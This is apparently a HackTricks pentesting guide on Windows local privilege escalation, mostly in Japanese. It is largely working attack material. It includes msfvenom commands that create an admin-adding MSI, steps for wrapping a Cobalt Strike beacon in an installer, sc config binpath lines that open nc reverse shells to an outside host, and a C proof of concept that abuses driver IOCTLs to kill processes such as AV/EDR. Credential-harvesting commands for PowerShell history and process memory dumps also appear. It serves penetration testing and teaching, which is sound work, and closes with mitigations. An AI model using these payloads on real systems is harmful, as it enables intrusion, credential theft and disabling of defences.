# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Initial Windows Theory

### アクセストークン

**Windows のアクセストークンが分からない場合は、先に次のページを読んでください：**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs、DACLs/SACLs/ACEs の詳細は次のページを参照してください：**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### 整合性レベル

**Windows の整合性レベルが分からない場合は、続行する前に次のページを読んでください：**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows のセキュリティ制御

Windows には、システムの列挙を**妨げる**、実行ファイルの実行を阻止する、あるいはあなたの活動を**検出する**など、さまざまな機能があります。権限昇格の列挙を開始する前に、次の**ページ**を**読み**、これらすべての**防御** **メカニズム**を**列挙**してください：


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

## システム情報

### バージョン情報の列挙

Windows のバージョンに既知の脆弱性がないか確認してください（適用されているパッチも確認すること）。
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### バージョン別エクスプロイト

この [site](https://msrc.microsoft.com/update-guide/vulnerability) は Microsoft のセキュリティ脆弱性に関する詳細情報を検索するのに便利です。 このデータベースは4,700件を超えるセキュリティ脆弱性を収録しており、Windows環境が持つ**巨大な攻撃面**を示しています。

**On the system**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeasにはwatsonが組み込まれている)_

**ローカル（システム情報あり）**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github のエクスプロイトリポジトリ:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### 環境

環境変数に資格情報や有用な情報が保存されていますか？
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell の履歴
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell トランスクリプトファイル

有効化する方法は次のページを参照してください: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell のパイプライン実行の詳細が記録されます。実行されたコマンド、コマンドの呼び出し、スクリプトの一部が含まれます。ただし、実行の全詳細や出力結果までは記録されない場合があります。

これを有効にするには、ドキュメントの「Transcript files」セクションの指示に従い、**"Module Logging"** を **"Powershell Transcription"** の代わりに選択してください。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShell ログの最後の15件のイベントを表示するには、次を実行します:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

スクリプトの実行に関する完全なアクティビティと全コンテンツの記録が取得され、各コードブロックが実行時に文書化されることが保証されます。このプロセスは各アクティビティの包括的な監査証跡を保存し、フォレンジック調査や悪意のある挙動の解析に有用です。実行時にすべてのアクティビティを記録することで、プロセスに関する詳細な洞察が提供されます。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block のログイベントは Windows Event Viewer の次のパスで確認できます: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
最後の20件のイベントを表示するには次を使用できます:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### インターネット設定
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### ドライブ
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

更新が http**S** ではなく http で要求されている場合、システムを乗っ取ることができます。

まず、ネットワークが非SSLの WSUS アップデートを使用しているかどうかを、cmd で次のコマンドを実行して確認します:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
または、PowerShell で次のように:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
次のような返信が返ってきた場合:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
そして、`HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` または `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` が `1` の場合。

その場合、 **悪用可能です。** 最後のレジストリ値が 0 の場合、WSUS エントリは無視されます。

これらの脆弱性を悪用するには、次のようなツールが使用できます: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - これらは非SSLのWSUSトラフィックに 'fake' 更新を注入するための MiTM 向けエクスプロイトスクリプトです。

調査は以下を参照：

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
基本的に、この不具合が悪用する欠陥は次のとおりです:

> ローカルユーザのプロキシを変更する権限があり、Windows Updates が Internet Explorer の設定で構成されたプロキシを使用する場合、ローカルで [PyWSUS](https://github.com/GoSecure/pywsus) を実行して自分のトラフィックを傍受し、アセット上で昇格したユーザとしてコードを実行することができます。
>
> さらに、WSUS サービスは現在のユーザの設定を使用するため、そのユーザの証明書ストアも使用します。WSUS ホスト名用の自己署名証明書を生成してそれを現在のユーザの証明書ストアに追加すれば、HTTP および HTTPS 双方の WSUS トラフィックを傍受することが可能になります。WSUS は証明書に対して信頼初回使用（trust-on-first-use）的な検証以外の HSTS のような仕組みを採用していません。提示された証明書がユーザにより信頼され、かつ正しいホスト名を持っていれば、サービスはそれを受け入れます。

この脆弱性はツール [**WSUSpicious**](https://github.com/GoSecure/wsuspicious)（入手可能になれば）を使用して悪用できます。

## Third-Party Auto-Updaters and Agent IPC (local privesc)

多くのエンタープライズエージェントは localhost の IPC サーフェスと特権付きのアップデートチャネルを公開しています。登録（enrollment）を攻撃者のサーバに強制でき、かつアップデータが不正なルート CA を信頼するか署名検証が弱い場合、ローカルユーザは SYSTEM サービスがインストールする悪意のある MSI を配布できます。一般化した手法（Netskope stAgentSvc チェーンに基づく – CVE-2025-0309）は以下を参照してください：

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## KrbRelayUp

Windows の **domain** 環境において、特定の条件下で **local privilege escalation** の脆弱性が存在します。これらの条件には、**LDAP signing が強制されていない**環境、ユーザが **Resource-Based Constrained Delegation (RBCD)** を構成できる自己権限を持っていること、そしてユーザがドメイン内にコンピュータを作成できる能力が含まれます。これらの **要件** は **デフォルト設定** のままでも満たされることに注意してください。

エクスプロイトは [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) で見つかります。

攻撃のフローの詳細については次を参照してください: [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**もし** これら 2 つのレジストリ値が **有効**（値が **0x1**）になっている場合、あらゆる権限のユーザが NT AUTHORITY\\**SYSTEM** として `*.msi` ファイルを **インストール**（実行）できます。
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
If you have a meterpreter session you can automate this technique using the module **`exploit/windows/local/always_install_elevated`**

### PowerUP

power-upの`Write-UserAddMSI`コマンドを使って、カレントディレクトリ内に権限昇格用のWindows MSIバイナリを作成します。このスクリプトはプリコンパイル済みのMSIインストーラーを書き出し、ユーザー/グループの追加を促します（そのためGIUアクセスが必要になります）:
```
Write-UserAddMSI
```
作成したバイナリを実行するだけで権限を昇格できます。

### MSI Wrapper

このチュートリアルを読んで、これらのツールを使ってMSI Wrapperを作成する方法を学んでください。コマンドラインを単に実行したいだけの場合は、"**.bat**" ファイルをラップすることができます。


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Generate** with Cobalt Strike or Metasploit a **new Windows EXE TCP payload** in `C:\privesc\beacon.exe`
- Visual Studio を開き、**Create a new project** を選択して検索ボックスに "installer" と入力します。**Setup Wizard** プロジェクトを選択して **Next** をクリックします。
- プロジェクト名を **AlwaysPrivesc** のように付け、場所には **`C:\privesc`** を使用し、**place solution and project in the same directory** を選択して **Create** をクリックします。
- **Next** をクリックし続けてステップ 3/4 (choose files to include) に進みます。**Add** をクリックして先ほど生成した Beacon ペイロードを選択し、**Finish** をクリックします。
- **Solution Explorer** で **AlwaysPrivesc** プロジェクトを選択し、**Properties** で **TargetPlatform** を **x86** から **x64** に変更します。
- **Author** や **Manufacturer** など、インストールされたアプリをより正当らしく見せるために変更できるプロパティが他にもあります。
- プロジェクトを右クリックして **View > Custom Actions** を選択します。
- **Install** を右クリックして **Add Custom Action** を選択します。
- **Application Folder** をダブルクリックし、**beacon.exe** を選択して **OK** をクリックします。これにより、インストーラーが実行されるとすぐに Beacon ペイロードが実行されます。
- **Custom Action Properties** の下で **Run64Bit** を **True** に変更します。
- Finally, **build it**.
- 警告 `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` が表示された場合は、プラットフォームを x64 に設定していることを確認してください。

### MSI Installation

悪意のある `.msi` ファイルのインストールをバックグラウンドで実行するには:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
この脆弱性を悪用するには次を使用できます: _exploit/windows/local/always_install_elevated_

## アンチウイルスと検出

### 監査設定

これらの設定は何が**ログに記録される**かを決めるので、注意を払ってください。
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding、ログがどこに送信されているかを把握するのは興味深い。
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** は、local Administrator passwords の管理のために設計されており、ドメインに参加しているコンピュータ上で各パスワードが一意にランダム化され、定期的に更新されることを保証します。これらのパスワードは Active Directory 内に安全に格納され、ACLs を通じて十分な権限が付与されたユーザーのみが、許可されている場合に local admin passwords を閲覧できます。


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

有効な場合、**plain-text passwords are stored in LSASS** (Local Security Authority Subsystem Service).\
[**このページの WDigest に関する詳細**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1** 以降、Microsoft は Local Security Authority (LSA) に対する保護を強化し、信頼されていないプロセスによる**メモリの読み取り**やコード注入の試みを**ブロック**してシステムをさらに保護するようになりました。\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** は **Windows 10** で導入されました。デバイスに保存された資格情報を、pass-the-hash attacks のような脅威から保護することを目的としています。| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### キャッシュされた資格情報

**ドメイン資格情報**は**Local Security Authority** (LSA) によって認証され、OSのコンポーネントによって利用されます。ユーザーのログオン情報が登録されたセキュリティパッケージによって認証されると、通常、そのユーザーのドメイン資格情報が確立されます。\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## ユーザーとグループ

### ユーザーとグループの列挙

所属するグループに興味深い権限があるか確認してください
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### 特権グループ

もしあなたが**ある特権グループに属している場合、権限を昇格できる可能性があります**。特権グループと、それらを悪用して権限昇格する方法は以下を参照してください:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### トークン操作

**詳しくは**このページで**token**が何かを確認してください: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
次のページで、**興味深い token について学び**、それらを悪用する方法を確認してください:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### ログオン中のユーザー / セッション
```bash
qwinsta
klist sessions
```
### ホームフォルダ
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### パスワードポリシー
```bash
net accounts
```
### クリップボードの内容を取得する
```bash
powershell -command "Get-Clipboard"
```
## 実行中のプロセス

### ファイルとフォルダの権限

まず、プロセスを一覧表示し、**プロセスのコマンドライン内のパスワードを確認してください**。\
実行中のバイナリを**上書きできるか**、またはバイナリフォルダに書き込み権限があるかを確認して、潜在的な [**DLL Hijacking attacks**](dll-hijacking/index.html) を悪用できるか調べてください:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
常に[**electron/cef/chromium debuggers**が稼働しているかを確認してください。これを悪用して権限を昇格させることができます](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md)。

**プロセスのバイナリの権限を確認する**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**プロセスのバイナリが置かれているフォルダの権限を確認する (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

実行中のプロセスのメモリダンプは、sysinternals の **procdump** を使って取得できます。FTP のようなサービスはメモリ上に **credentials in clear text in memory** を保持していることがあるため、メモリをダンプしてこれらの認証情報を読み取ってみてください。
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### 不安全な GUI アプリ

**SYSTEMとして実行されているアプリケーションは、ユーザーがCMDを起動したり、ディレクトリを参照したりできる可能性があります。**

例: "Windows Help and Support" (Windows + F1)、"command prompt" を検索して、"Click to open Command Prompt" をクリック

## サービス

サービスの一覧を取得する:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### 権限

サービスの情報を取得するには **sc** を使用できます。
```bash
sc qc <service_name>
```
各サービスに必要な特権レベルを確認するために、_Sysinternals_ のバイナリ **accesschk** を用意することを推奨します。
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
「Authenticated Users」が任意のサービスを変更できるかどうかを確認することをお勧めします:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### サービスを有効化

例えば SSDPSRV で次のようなエラーが発生する場合:

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

次のコマンドで有効化できます
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**サービス upnphost が動作するには SSDPSRV に依存していることを考慮してください (XP SP1 の場合)**

**別の回避策**は、次を実行することです:
```
sc.exe config usosvc start= auto
```
### **Modify service binary path**

In the scenario where the "Authenticated users" group possesses **SERVICE_ALL_ACCESS** on a service, modification of the service's executable binary is possible. To modify and execute **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### サービスの再起動
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
権限は次のような複数のアクセス許可を通じて昇格できます:

- **SERVICE_CHANGE_CONFIG**: サービスのバイナリを再構成することを許可します。
- **WRITE_DAC**: 権限の再構成を可能にし、結果的にサービス構成を変更できるようになります。
- **WRITE_OWNER**: 所有権の取得と権限の再構成を許可します。
- **GENERIC_WRITE**: サービス構成を変更する能力を含みます。
- **GENERIC_ALL**: 同様にサービス構成を変更する能力を含みます。

この脆弱性の検出と悪用には _exploit/windows/local/service_permissions_ を使用できます。

### サービスバイナリの弱い権限

**サービスによって実行されるバイナリを変更できるかを確認する**、またはバイナリが配置されているフォルダに **書き込み権限があるかを確認する**（[**DLL Hijacking**](dll-hijacking/index.html)）**。**\
サービスによって実行されるすべてのバイナリは **wmic** を使用して取得でき（not in system32）、権限は **icacls** で確認できます:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
また **sc** と **icacls** を使用できます:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### サービス レジストリの変更権限

任意のサービス レジストリを変更できるか確認してください。\
次のようにサービスの**レジストリ**に対する**権限**を**確認**できます:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
サービスが実行するバイナリを変更できるかどうか、**Authenticated Users** または **NT AUTHORITY\INTERACTIVE** が `FullControl` 権限を持っているか確認する必要があります。もしそうなら、サービスによって実行されるバイナリを変更できます。

実行されるバイナリの Path を変更するには：
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### サービス レジストリ AppendData/AddSubdirectory permissions

If you have this permission over a registry this means to **you can create sub registries from this one**. In case of Windows services this is **enough to execute arbitrary code:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

If the path to an executable is not inside quotes, Windows will try to execute every ending before a space.

For example, for the path _C:\Program Files\Some Folder\Service.exe_ Windows will try to execute:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
組み込みの Windows サービスに属するものを除き、すべての引用符で囲まれていないサービスパスを列挙します:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**この脆弱性を検出および悪用できます** metasploit: `exploit/windows/local/trusted\_service\_path` You can manually create a service binary with metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### 回復アクション

Windowsでは、サービスが失敗した場合に実行するアクションをユーザーが指定できます。この機能は実行先としてbinaryを指定するように設定できます。もしこのbinaryを置き換え可能であれば、privilege escalationが可能になる場合があります。詳細は[公式ドキュメント](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>)を参照してください。

## アプリケーション

### インストール済みアプリケーション

**permissions of the binaries**（上書きできればprivilege escalationが可能かもしれません）および**folders**（[DLL Hijacking](dll-hijacking/index.html)）の権限を確認してください。
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### 書き込み権限

管理者アカウントによって実行されるバイナリ（schedtasks）を変更できるか、あるいは特定のファイルを読むために設定ファイルを変更できるかを確認してください。

システム内の弱いフォルダー／ファイルの権限を見つける方法の一つは次のとおりです：
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### 起動時に実行されるもの

**別のユーザーによって実行されるレジストリやバイナリを上書きできるか確認する。**\
**以下のページ**を参照して、興味深い **autoruns locations to escalate privileges** について詳しく学んでください:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### ドライバ

サードパーティ製の**怪しい/脆弱な**ドライバがないか探す
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
ドライバが arbitrary kernel read/write primitive（不適切に設計された IOCTL ハンドラでよく見られる）を公開している場合、kernel memory から直接 SYSTEM token を盗むことで権限昇格できます。ステップバイステップの手法はこちらを参照してください:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### device objects における FILE_DEVICE_SECURE_OPEN の欠如の悪用（LPE + EDR kill）

署名された一部のサードパーティドライバは、IoCreateDeviceSecure を使って強力な SDDL で device object を作成しますが、DeviceCharacteristics に FILE_DEVICE_SECURE_OPEN を設定し忘れることがあります。このフラグがないと、追加のコンポーネントを含むパス経由でデバイスを開いた場合に secure DACL が適用されず、特権のない任意のユーザが次のような名前空間パスを使ってハンドルを取得できます:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

ユーザがデバイスを開けるようになると、ドライバが公開する特権付きの IOCTLs を LPE や tampering に悪用できます。実際に観測された例:

- 任意のプロセスに対してフルアクセスのハンドルを返す（token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser）。
- 制限のない raw disk read/write（オフラインでの改ざん、ブート時永続化トリック）。
- Protected Process/Light (PP/PPL) を含む任意のプロセスを終了させることができ、これによりカーネル経由でユーザランドから AV/EDR を kill できます。

最小限の PoC パターン (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
開発者向けの緩和策
- デバイスオブジェクトを作成する際、DACLで制限する予定のものには常に FILE_DEVICE_SECURE_OPEN を設定する。
- 特権操作では呼び出し元のコンテキストを検証する。プロセスの終了やハンドルの返却を許可する前に PP/PPL チェックを追加する。
- IOCTLs（アクセスマスク、METHOD_*、入力検証）を制限し、直接的なカーネル権限の代わりにブローカー型モデルを検討する。

ディフェンダー向けの検出案
- 怪しいデバイス名（例: \\ .\\amsdk*）へのユーザーモードからのオープンや、悪用を示す特定の IOCTL シーケンスを監視する。
